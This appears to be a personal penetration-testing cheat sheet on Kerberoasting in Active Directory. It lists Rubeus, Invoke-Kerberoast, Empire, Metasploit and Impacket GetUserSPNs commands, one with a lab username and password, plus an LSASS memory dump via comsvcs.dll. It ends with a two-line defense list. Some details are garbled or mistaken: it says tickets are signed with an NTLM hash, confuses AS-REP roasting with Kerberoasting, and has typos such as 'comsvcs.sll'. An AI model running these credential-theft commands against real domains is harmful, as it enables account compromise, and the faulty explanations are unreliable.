 >"MS SQL, the Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service"

Kerbroasting is technique in which you bruteforce encrypted NTLM hashes. which you can dump in multiple ways listed in workflow3
**Kerbroasting:**

![[Pasted image 20220517175401.png]]

***New Kerbroasting method on Host System***

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with [UserAccountControl setting “Do not require Kerberos preauthentication” enabled](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/), it is possible to request and receive a ticket to crack without a valid account on the domain.

- Rubeus.exe
	`Rubeus.exe kerberoast /outfile:hash.txt`
- ps1 Powershell Script
	`Import-Module .\Invoke-Kerbroast.ps1`
	`Invoke-Kerbroast.ps1`

***New Kerbroasting method on Remote System***
- Powershell Empire
	`usermodule credentials/invoke_kerberoast`
	`execute`
- Impacket
- Metasploit
	`powershell_import /root/powershell/Invoke-kerberost.ps1`
	`powershell_execute Invoke-Kerberost`
- Pypykatz from powershell
	`load powershell`
	`powershell_shell`
	`Get-Process Lsass`
	`cd C:\Windows\System32`
	`.\rundll32.exe comsvcs.sll, MiniDump 628 C:\lsass.DMP full`

- ***If you have normal user account and want to get the hash of  other users associated with that account then***
	- Requirement: Normal username and password (***Kerberosting***)
```bash
# List the username associated with normal user account
GetUserSPNs.py -request -dc-ip [IP] [domain]/[normal_user] -save -outfile userlist
impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.50.95
# Example
# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs -save -outfile userlist

```

## References
https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/


#### Defense
- Strong passwords
- Least Privilege